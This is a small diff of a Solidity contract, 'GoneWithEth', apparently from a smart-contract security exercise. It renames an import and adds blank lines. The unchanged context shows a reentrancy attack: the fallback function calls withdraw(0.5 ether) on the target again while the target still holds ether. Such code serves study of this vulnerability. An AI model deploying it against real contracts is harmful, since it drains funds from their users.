@@ -1,6 +1,6 @@
 pragma solidity ^0.5.11;
 
-import "./ex30_Reentrancy.sol";
+import "./Reentrance.sol";
 
 contract GoneWithEth {
 
@@ -22,6 +22,7 @@ contract GoneWithEth {
     }
 
     function() external payable {
+
         if (address(reentrance).balance > 0 ) {
             reentrance.withdraw(0.5 ether);
         }
@@ -34,4 +35,5 @@ contract GoneWithEth {
     function getBalance() public view returns (uint) {
         return address(this).balance;
     }
+
 }
